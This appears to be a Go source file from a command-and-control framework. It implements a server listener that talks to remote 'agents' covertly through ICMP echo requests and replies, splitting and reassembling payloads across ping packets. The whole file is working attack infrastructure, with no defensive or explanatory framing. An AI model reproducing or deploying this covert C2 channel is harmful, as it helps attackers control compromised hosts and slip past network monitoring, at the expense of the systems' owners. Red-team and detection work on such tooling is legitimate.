package server

import (
	"fmt"
	"log/slog"
	"net"
	"runtime/debug"
	"sync"

	"github.com/forgec2/forgec2/pkg/protocol"
	"golang.org/x/net/icmp"
	"golang.org/x/net/ipv4"
)

type ICMPBeaconListener struct {
	addr    string
	handler func(agentID string, reqJSON []byte) []byte
	conn    *icmp.PacketConn
	mu      sync.Mutex
	wg      sync.WaitGroup
	started bool
	asm     *protocol.ICMPAssembler
}

func NewICMPBeaconListener(addr string) *ICMPBeaconListener {
	if addr == "" {
		addr = "0.0.0.0"
	}
	return &ICMPBeaconListener{addr: addr, asm: protocol.NewICMPAssembler()}
}

func (l *ICMPBeaconListener) SetHandler(h func(agentID string, reqJSON []byte) []byte) {
	l.mu.Lock()
	defer l.mu.Unlock()
	l.handler = h
}

func (l *ICMPBeaconListener) Start() error {
	conn, err := icmp.ListenPacket("ip4:icmp", l.addr)
	if err != nil {
		return err
	}
	l.conn = conn
	slog.Info("ICMP C2 listener started", "addr", l.addr)

	l.wg.Add(1)
	l.started = true
	go func() {
		defer l.wg.Done()
		l.serve()
	}()
	return nil
}

func (l *ICMPBeaconListener) Stop() {
	if l.conn != nil {
		l.conn.Close()
	}
	if l.started {
		l.wg.Wait()
	}
}

func (l *ICMPBeaconListener) Close() error {
	l.Stop()
	return nil
}

func (l *ICMPBeaconListener) serve() {
	buf := make([]byte, 8192)
	for {
		n, peer, err := l.conn.ReadFrom(buf)
		if err != nil {
			if netErr, ok := err.(net.Error); ok && netErr.Temporary() {
				continue
			}
			slog.Error("ICMP read error (listener stopping)", "err", err)
			return
		}

		msg, err := icmp.ParseMessage(ipv4.ICMPTypeEcho.Protocol(), buf[:n])
		if err != nil {
			continue
		}
		if msg.Type != ipv4.ICMPTypeEcho {
			continue
		}
		echo, ok := msg.Body.(*icmp.Echo)
		if !ok || len(echo.Data) == 0 {
			continue
		}

		payload := echo.Data
		if !protocol.ICMPMaybePlain(payload) {
			msgID, total, index, chunk, ok := protocol.ICMPFragParse(payload)
			if !ok {
				continue
			}
			key := fmt.Sprintf("%s:%d:%d", peer.String(), echo.ID, msgID)
			assembled, err := l.asm.Add(key, total, index, chunk)
			if err != nil || assembled == nil {
				continue
			}
			payload = assembled
		}

		agentID := peer.String()
		l.mu.Lock()
		h := l.handler
		l.mu.Unlock()
		if h == nil {
			continue
		}
		respData := func() (resp []byte) {
			defer func() {
				if r := recover(); r != nil {
					slog.Error("ICMP handler panic", "err", r, "stack", string(debug.Stack()))
				}
			}()
			return h(agentID, payload)
		}()
		if respData == nil {
			continue
		}

		frags := protocol.ICMPFragSplit(respData)
		if len(frags) == 0 {
			frags = [][]byte{respData}
		}
		for i, f := range frags {
			reply := icmp.Message{
				Type: ipv4.ICMPTypeEchoReply,
				Code: 0,
				Body: &icmp.Echo{
					ID:   echo.ID,
					Seq:  echo.Seq + i,
					Data: f,
				},
			}
			rb, err := reply.Marshal(nil)
			if err != nil {
				continue
			}
			if _, err := l.conn.WriteTo(rb, peer); err != nil {
				slog.Debug("ICMP write reply failed", "peer", peer, "err", err)
			}
		}
	}
}
